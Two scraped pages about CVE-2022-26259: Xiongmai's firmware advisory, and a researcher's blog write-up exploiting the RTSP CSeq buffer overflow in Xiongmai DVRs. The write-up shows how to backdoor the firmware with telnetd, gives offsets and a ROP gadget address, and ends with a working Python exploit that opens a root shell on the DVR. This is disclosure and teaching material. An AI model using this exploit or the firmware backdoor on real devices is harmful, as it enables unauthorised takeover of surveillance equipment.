=== Content from www.xiongmaitech.com_fa7146e2_20250115_094851.html ===

[![](http://www.xiongmaitech.com/en/static/web/img/logo.png?v=v2 )](http://www.xiongmaitech.com/en/index.php%20 "Hangzhou Xiongmai Technology Co.,LTD.
")

![](http://www.xiongmaitech.com/en/static/web/img/a1.png?v=v2 )
[Chinese](http://www.xiongmaitech.com/)![](http://www.xiongmaitech.com/en/static/web/img/header_icon1.png?v=v2 )[English](http://www.xiongmaitech.com/en/index.php%20)

* [HOME](http://www.xiongmaitech.com/en/index.php%20)
* [PRODUCTS](http://www.xiongmaitech.com/en/index.php/product%20)
  + [![](http://www.xiongmaitech.com/en/upload/2017/10/23/15087412247455jlmvt.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    IP Camera Module](http://www.xiongmaitech.com/en/index.php/product/product-list/3%20)
  + [![](http://www.xiongmaitech.com/en/upload/2019/05/15/1557888298587847pvr.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    Intelligent analysis module](http://www.xiongmaitech.com/en/index.php/product/product-list/185%20)
  + [![](http://www.xiongmaitech.com/en/upload/2021/06/19/16240810509952yfl0a.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    Battery Camera Module](http://www.xiongmaitech.com/en/index.php/product/product-list/204%20)
  + [![](http://www.xiongmaitech.com/en/upload/2017/10/23/15087392941506azt74.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    consumer module](http://www.xiongmaitech.com/en/index.php/product/product-list/190%20)
  + ![](http://www.xiongmaitech.com/en/static/web/img/product_b02.png?v=v2 )
  + [![](http://www.xiongmaitech.com/en/upload/2017/10/23/15087412753986ljyj3.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    Panoramic VR](http://www.xiongmaitech.com/en/index.php/product/product-list/172%20)
  + [![](http://www.xiongmaitech.com/en/upload/2017/11/09/15102078930744efb0i.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    WiFi Kit](http://www.xiongmaitech.com/en/index.php/product/product-list/177%20)
  + [![](http://www.xiongmaitech.com/en/upload/2015/10/26/144584083955742fpgm.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    AHD Camera Module](http://www.xiongmaitech.com/en/index.php/product/product-list/1%20)
  + [![](http://www.xiongmaitech.com/en/upload/2017/05/11/14944834256698fsklp.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    XVI&AHD Hybrid Camera Module](http://www.xiongmaitech.com/en/index.php/product/product-list/181%20)
  + ![](http://www.xiongmaitech.com/en/static/web/img/product_b02.png?v=v2 )
  + [![](http://www.xiongmaitech.com/en/upload/2015/10/20/144531892030010qoj1.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    AF module](http://www.xiongmaitech.com/en/index.php/product/product-list/27%20)
  + [![](http://www.xiongmaitech.com/en/upload/2015/10/20/1445318556687952ok6.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    NVR Board](http://www.xiongmaitech.com/en/index.php/product/product-list/4%20)
  + [![](http://www.xiongmaitech.com/en/upload/2015/10/26/1445840475460779oy9.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    XVI/AHD DVR Board](http://www.xiongmaitech.com/en/index.php/product/product-list/2%20)
  + [![](http://www.xiongmaitech.com/en/upload/2018/04/23/152447139279161uhsu.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    H.265 XVI DVR Board](http://www.xiongmaitech.com/en/index.php/product/product-list/206%20)
  + ![](http://www.xiongmaitech.com/en/static/web/img/product_b02.png?v=v2 )
  + [![](http://www.xiongmaitech.com/en/upload/2023/03/10/16784322811668hc7nf.png )![](http://www.xiongmaitech.com/en/static/web/img/product_b01.png?v=v2 )

    Dual-lens Camera Module](http://www.xiongmaitech.com/en/index.php/product/product-list/230%20)
* [NEWS](http://www.xiongmaitech.com/en/index.php/news/10%20)
  + [Press Release](http://www.xiongmaitech.com/en/index.php/news/10)
  + [Industry Trends](http://www.xiongmaitech.com/en/index.php/news/11)
  + [Events](http://www.xiongmaitech.com/en/index.php/news/12)
  ![](http://www.xiongmaitech.com/en/upload/2015/10/22/14454925389598wuq96.png )

  [《Himalaya Ladder》 is coming, xiongmai is the sponsor of dream.](http://www.xiongmaitech.com/en/index.php/news/info/10/31)
* [SUPPORT](http://www.xiongmaitech.com/en/index.php/service/down/13%20)
  + [Download](http://www.xiongmaitech.com/en/index.php/service/down/13)
    [Equipment firmware](http://www.xiongmaitech.com/en/index.php/service/down/13)
  + [Cyber Security](http://www.xiongmaitech.com/en/index.php/service/security/51)
    [Security Circular](http://www.xiongmaitech.com/en/index.php/service/security/51)
    [Vulnerability Reporting](http://www.xiongmaitech.com/en/index.php/service/security/52)
  ![](http://www.xiongmaitech.com/en/upload/2015/11/25/14484454871433x989n.jpg )

  [We provide high quality product ,edge technology and excellent service.](http://www.xiongmaitech.com/en/index.php/service)
* [ABOUT US](http://www.xiongmaitech.com/en/index.php/about/company/18%20)
  + [Company profile](http://www.xiongmaitech.com/en/index.php/about/company/18)[Company](http://www.xiongmaitech.com/en/index.php/about/company/18)[Company culture](http://www.xiongmaitech.com/en/index.php/about/company/19)[Development course](http://www.xiongmaitech.com/en/index.php/about/company/20)

  + [Contact us](http://www.xiongmaitech.com/en/index.php/about/contact/42)
    [Headquarters](http://www.xiongmaitech.com/en/index.php/about/contact/42)
    [XM Shenzhen](http://www.xiongmaitech.com/en/index.php/about/contact/5)
  ![](http://www.xiongmaitech.com/en/upload/2015/12/22/14507656003149anbpb.jpg )

  [Hangzhou Xiongmai Technology Co.,Ltd concentrates on security surveillance ,Video intelligent research and development.](http://www.xiongmaitech.com/en/index.php/about/company/18)

![](http://www.xiongmaitech.com/en/upload/2015/09/16/144237477429tyxp4.jpg)

* [Download](http://www.xiongmaitech.com/en/index.php/service/down/13)
  + [Equipment firmware](http://www.xiongmaitech.com/en/index.php/service/down/13%20)

* [Cyber Security](http://www.xiongmaitech.com/en/index.php/service/security/51)
  + [Security Circular](http://www.xiongmaitech.com/en/index.php/service/security/51%20)
  + [Vulnerability Reporting](http://www.xiongmaitech.com/en/index.php/service/security/52%20)

### Memory overflow vulnerability of some XM devices

##### 2022-02-22 12:00:00

No：XM-SN-XMSRC2201

CVE-2022-26259

Date of the first release：2022-02-22

**Abstract**:

Some devices have a memory overflow vulnerability, which will cause the device to restart，XM have fix this vulnerability on the new devices and new firmware .

Product models and version involved and the fixed version

| Product Models | Affected version | Fixed version |
| --- | --- | --- |
| NBD80X16S-KL  NBD80X09S-KL  NBD80X08S-KL  NBD80X09RA-KL | YK\_HZXM\_NBD80X16S-KL\_V4.03.  R11.Nat.dss.OnvifC.20210727.bin | YK\_HZXM\_NBD80X16S-KL\_V4.03.R11.Nat.dss.OnvifC.20220217.bin |
| AHB80X04R-MH  AHB80X04R-MH-V2  AHB80X04-R-MH-V3 | YK\_HZXM\_AHB80X04R-MH\_V4.03.R11.Nat.dss.OnvifC.20210729.bin | YK\_HZXM\_AHB80X04R-MH\_V4.03.R11.Nat.dss.OnvifC.20220212.bin |
| AHB80N16T-GS | YK\_HZXM\_AHB80N16T-GS\_V4.03.R11.7601.Nat.OnvifC.20211223.bin | YK\_HZXM\_AHB80N16T-GS\_V4.03.R11.7601.Nat.OnvifC.20220210.bin |
| AHB80N32F4-LME | YK\_HZXM\_AHB80N32F-LME\_V4.03.R11.7601.Nat.OnvifC.20211228.bin | YK\_HZXM\_AHB80N32F-LME\_V4.03.R11.7601.Nat.OnvifC.20220210.bin |
| NBD90S0VT-QW | YK\_HZXM\_NBD90S08VT-QW\_V4.03.R11.713g.Nat.OnvifC.2021.bin | YK\_HZXM\_NBD90S08VT-QW\_V4.03.R11.713g.Nat.OnvifC.20220219.bin |

Vulnerability score details

The vulnerability has been graded by cvssv3 scoring system

（<http://www.first.org/cvss/specification-document>）

Basic score: 7.8（AV:L / AC：L / PR：L / UI：N / S：U / C：H / I：H / A：H）

**Get firmware version**

Contact the XM technical support to get the device firmware download the firmware from the website（website ：[https://baike.xm030.cn](https://baike.xm030.cn/)）

**Resources**

This vulnerability was disclosed by Mr. Chris leech

We are very grateful to Mr. Chris leech for helping us disclose this vulnerability, actively communicating and guiding with us, and discussing this vulnerability and solutions with us

Thanks again to Mr. Chris leech for his dedication !

**Revision history**

2022-02-22 V1.0 (Initial version)

* ![](http://www.xiongmaitech.com/en/static/web/img/foot_icon1.png?v=v2 )

  Tel： +86-0571-23271188
* ![](http://www.xiongmaitech.com/en/static/web/img/foot_icon2.png?v=v2 )

  Email： oversea\_sales@xiongmaitech.com
* ![](http://www.xiongmaitech.com/en/static/web/img/foot_icon4.png?v=v2 )

  Address： Building No.9, Yinhu Innovation Center, Hangzhou, China

* [Product](http://www.xiongmaitech.com/en/index.php/product%20)
  [IP Camera Module](http://www.xiongmaitech.com/en/index.php/product/product-list/3%20)
  [Intelligent analysis module](http://www.xiongmaitech.com/en/index.php/product/product-list/185%20)
  [Battery Camera Module](http://www.xiongmaitech.com/en/index.php/product/product-list/204%20)
  [consumer module](http://www.xiongmaitech.com/en/index.php/product/product-list/190%20)
  [Panoramic VR](http://www.xiongmaitech.com/en/index.php/product/product-list/172%20)
  [more](http://www.xiongmaitech.com/en/index.php/product%20)
* [News](http://www.xiongmaitech.com/en/index.php/news/10%20)
  [Press Release](http://www.xiongmaitech.com/en/index.php/news/10%20)
  [Industry Trends](http://www.xiongmaitech.com/en/index.php/news/11%20)
  [Events](http://www.xiongmaitech.com/en/index.php/news/12%20)
* [Support](http://www.xiongmaitech.com/en/index.php/service/down/13%20)[DOWNLOAD](http://www.xiongmaitech.com/en/index.php/service/down/13)
* [About us](http://www.xiongmaitech.com/en/index.php/about/company/18%20)[Company profile](http://www.xiongmaitech.com/en/index.php/about/company/18)[Contact us](http://www.xiongmaitech.com/en/index.php/about/contact/42)

[SiteMap](http://www.xiongmaitech.com/sitemap.xml)
丨
[Hangzhou Jufeng Technology](http://www.jufenginfo.com/)
丨
[HiSilicon (Shanghai) Technologies](http://www.hisilicon.com/)
丨
[NEXTCHIP](http://www.nextchip.com/)
丨
[TEXAS Instruments](http://www.ti.com/)
丨

[XM Cloud](http://www.xmeye.net/index)

COPYRIGHT © 2015 XM RIGHTS RESERVED
Zhejiang ICP No.10052164-1
[Website construction：](http://www.bocweb.cn/ "博采网络")
[Broadcull network](http://www.bocweb.cn/ "博采网络")

![](http://www.xiongmaitech.com/en/static/web/img/sd_1.png?v=v2 )[![]()](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33018302000328)



=== Content from blog.ret2.me_aef873d5_20250115_094850.html ===
[Navigate back to the homepage](/)copied
# Exploiting: Buffer overflow in Xiongmai DVRs

[![](/images/pfp.jpg)**Chris Leech**
,](/authors/chris-leech/)
January 26, 2022
• 8 min read![](/images/dvr4-4.png)

As part of my work at [FortNet](https://fortnet.co.uk) I’ve had the chance to research some embedded devices. This provided a good chance to learn more about the ARM architecture and the differences between ARM and x86 exploitation.

Often, IoT is overlooked in threat assessments due to most consumer devices acting as black boxes with closed source code. Threat actors have and will continue to use exploits in embedded devices for initial access to networks. For example, the [2015 breach](https://en.wikipedia.org/wiki/Hacking_Team#2015_data_breach) of Hacking Team by Phineas Fisher involved a simple shellshock exploit against their SonicWall applicance.

# Choosing a target

To even start my research, I needed physical access to a widely used embedded device. The candidate was a cheap “Hiseeu” DVR off Aliexpress which would ship with generic firmware. You can get a sense of how many devices are impacted when looking at the list of vendors rebranding Xiongmai.

![](/images/vendors.webp)

# Gaining access

After a month or so of waiting, I received the DVR and got to work. While the firmware is easily available online, to exploit any memory corruption vulnerabilities I would need to attach a debugger such as gdb with gdbserver.

Research on these devices back in 2017 is available on [Github](https://github.com/tothi/pwn-hisilicon-dvr). I was hoping for easy access via telnet or the 9527 backdoor port mentioned within. In my better judgement I decided not to give the device access to my network. Using an ethernet cable between a laptop and the DVR directly allowed me to view the web interface.

![](/images/web_first.png)

With network access, I decided to do a port scan to see any open ports that could be useful. I was out of luck and both the telnet and backdoor ports were closed.

![](/images/portscan.PNG)

Opening the casing and looking at the circuit board revealed a labelled serial connector with GND, TX, RX. Connecting to this at the default baud rate of 115200bps gave me access to the U-Boot console. However, no amount of changing bootargs to mess with the init, tty or single-user mode would give me a shell.

At the risk of breaking the DVR and turning it into a paperweight, my last idea was to create a backdoored firmware.

```
root@thinkpad:/home/chris/Downloads/xiongmai# file C638023A.bin
C638023A.bin: Zip archive data, at least v2.0 to extract
root@thinkpad:/home/chris/Downloads/xiongmai# mv C638023A.bin fw.zip
root@thinkpad:/home/chris/Downloads/xiongmai# unzip fw.zip
Archive: fw.zip
  inflating: web-x.cramfs.img
  inflating: custom-x.cramfs.img
  inflating: user-x.cramfs.img
  inflating: uImage.img
  inflating: romfs-x.cramfs.img
  inflating: logo-x.cramfs.img
  inflating: u-boot.bin.img
  inflating: InstallDesc

```

Using firmware mod kit with the extract\_firmware.sh script, the main filesystem was extracted. To try and get a shell /etc/init.d/rcS was modified so telnetd starts on each boot.

![](/images/initd.PNG)

The modified romfs is rebuilt using build\_firmware.sh and can be zipped up with the other components to create a full firmware image.

```
# cp firmware-mod-kit/fmk/new-firmware.bin romfs-x.cramfs.img
# rm -rf firmware-mod-kit/
# zip -r backdoored.bin *

```

After installing a Windows VM and disabling some security controls in Internet Explorer - I was able to use the interface and upgrade.

![](/images/upgrade.PNG)

Since there are no checks to verify if a firmware upgrade is legitimate, it completed successfully and I can move onto finding an exploit. Lack of firmware integrity checks on these devices is a [known issue](https://sec-consult.com/blog/detail/millions-of-xiongmai-video-surveillance-devices-can-be-hacked-via-cloud-feature-xmeye-p2p-cloud/) exploited in the wild since 2019.

```
# telnet 192.168.1.10 4444
Trying 192.168.1.10...
Connected to 192.168.1.10.
Escape character is '^]'.
~ #

```
# The bug

A couple minutes into network fuzzing, I was able to find a promising crash within the RTSP server. Looking for the PID listening on 554, I can see that /var/Sofia is responsible for handling the service. This binary is responsible for most functions on the device, such as the web server (80), RTSP (554) and DVRIP (34567).

The request that caused the crash looked like this:

```
OPTIONS rtsp://127.0.0.1/media.mp4 RTSP/1.0
CSeq: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(3000 A's)...

```

To understand what was happening, I opened the Sofia binary in Ghidra. It was likely due to an unsafe strcpy or strncpy since the buffer stopped being copied on a NULL byte (\x00). The binary is stripped and quite large, so it took a bit of trial and error with breakpoints until I identified the problem.

I’ve renamed some variables to make it easier to read.

![](/images/sofia1.png)

A fixed buffer of size 2048 bytes is allocated and the RTSP request data is checked to make sure it has a value.

![](/images/sofia2.png)

The RTSP request is checked to see if it contains two carriage returns. The length of the request is stored in payloadLen.

![](/images/sofia3.png)

Finally, strncpy moves (payloadLen) bytes of (payloadData) into the fixed 2048 buffer. This allows for a buffer overflow if the request is over 2048 bytes.

# The exploit

Full ASLR is enabled which means the position of the stack, VDSO and shared memory regions will be randomized. However, using checksec we can see that the binary has not been compiled as a position-independent executable (no PIE).

```
Escape character is '^]'.
~ # cat /proc/sys/kernel/randomize_va_space
2

```
```
root@thinkpad:/home/chris# checksec --file=Sofia
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               23              Sofia

```

To verify that the PC register can be controlled, we can attach gdb and send the payload with a simple python program.

```
import socket

filler = b"A" * 3000
payload = b"OPTIONS rtsp://127.0.0.1/media.mp4 RTSP/1.0\r\nCSeq: %s\r\n\r\n" % filler
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(6)
sock.connect(("192.168.1.10", 554))
sock.send(payload)

```

When sent, there is a nice crash showing the PC filled with A’s. The program counter (PC) can be compared to the EIP register on x86. Control over it means we can jump to functions or shellcode to try and exploit the bug.

![](/images/crashnice.PNG)

\**Technically, we are overwriting the frame pointer (FP) and then the link register (LR) after. This is important because the link register contains the return address. If we can overwrite the LR then PC will be controlled once the function tries to return. Unlike x86 there are multiple ways to return from a function. The important thing is controlling LR when it does.*

To find the exact point where it’s overwritten, a random string is written instead of A’s.

```
import socket, string, random

def randomword(length):
   letters = string.ascii_uppercase
   return ''.join(random.choice(letters) for i in range(length))

filler = bytes(randomword(3000), 'utf-8')
print(filler)
payload = b"OPTIONS rtsp://127.0.0.1/media.mp4 RTSP/1.0\r\nCSeq: %s\r\n\r\n" % filler
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(6)
sock.connect(("192.168.1.10", 554))
sock.send(payload)

```

The register is overwritten with the characters backwards due to little-endianess.

![](/images/pattern-1.PNG)

Looking for the string “MMGS” in the text tells me 2009 bytes of padding is required and the next four bytes will be the value of PC.

Now where do we return to?

The research in 2017 abused a directory traversal flaw in the uc-httpd webserver to bypass ASLR. This has been patched and my DVR firmware version isn’t vulnerable. I need to take advantage of the non-PIE compiled binary to exploit this bug. In simple terms, this means the binary itself executes from the same addresses. For example, the system function at 0x011ef4 will stay at 0x011ef4 while the system function from libc at 0xb6f12444 will change each time the program is run.

![](/images/comparison-1.png)

A pointer to our RTSP request is stored in the R9 register. To execute a command with the system() function, it must be null terminated and in the R0 register. If we can move this address into R0 and call system, any command could be executed.

![](/images/request.PNG)

To do this, I’ll find a “gadget” which will do what we want. In this case, we want R9 to be moved into R0 and then the address of system placed in PC. In ARM the first part would be “mov r0, r9”.

The Sofia binary is large enough to provide almost any gadget I could want. If this wasn’t the case, a chain of gadgets using either ROP (return oriented programming) or JOP (jump oriented programming) would be needed.

Objdump and grep worked here, though tools such as [Ropper](https://github.com/sashs/ropper) exist if you’re not so lucky.

![](/images/goodgadget.PNG)

The perfect gadget is available at 0x35c1b8. It simply moves R9 to R0 and calls system. This is enough to completely bypass ASLR.

This is how a finished exploit looks for my firmware version. Some things to keep in mind:

* Addresses must be written backwards due to little-endianess.
* If your firmware is not the same version as mine (V4.03.R11.C638023A) the exploit below probably won’t work. A new gadget address must be found for each version (potentially the amount of filler bytes as well).
* There is a watchdog which will eventually reboot the device after any failed exploit attempt. Targeted attacks are a very real threat but mass-exploitation without version disclosure/chaining another vulnerability is unlikely.

```
import socket
command = b";telnetd -p1234 -l/bin/sh;#" # Execute command, ignore junk before/after

filler = command # Start CSeq with command
filler += b"A" * (2009 - len(command)) # Fill 2009 bytes in total
filler += b"\xb8\xc1\x35\x00" # Gadget (mov r0,r9  bl system)
payload = b"OPTIONS rtsp://127.0.0.1/media.mp4 RTSP/1.0\r\nCSeq: %s\r\n\r\n" % filler
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(6)
sock.connect(("192.168.1.10", 554))
sock.send(payload)
print("Exploit sent.")

```

Here’s how it looks in action :)

![](/images/demo.png)

# Summary

This was a lot of fun and a great learning experience, despite it being a very simple exploit. Just by looking at Shodan, a large number of potentially vulnerable devices are exposed. Make sure no un-patched devices on your network are unintentionally exposed to the internet.

![](/images/shodan.PNG)

I contacted Xiongmai’s security team and they have quickly rolled out fixes for affected devices. The updated firmware can be downloaded [**here**](https://baike.xm030.cn) and installed via the web interface. Xiongmai’s response time was very impressive considering the reputation many Chinese vendors have.

* 27/01/2022 - Attempted contact
* 09/02/2022 - Provided more detailed information
* 22/02/2022 - Fixed firmware is available for all vulnerable models

![](/images/vuln-1.png)

Massive thanks to Azeria Labs and Attify for their great learning materials; I’m still new to ARM exploitation, so I may have been incorrect at points during this post. In the future I hope to challenge myself with research into embedded security appliances (VPNs, gateways etc.)

### More articles from ret2.me

[![](/images/dvr4-4.png)
## Exploiting: Buffer overflow in Xiongmai DVRs

Defeating ASLR and popping shells on ARM based IoT

January 26, 2022 · 8 min read](/post/2022-01-26-exploiting-xiongmai-dvrs/)© 2023 ret2.me
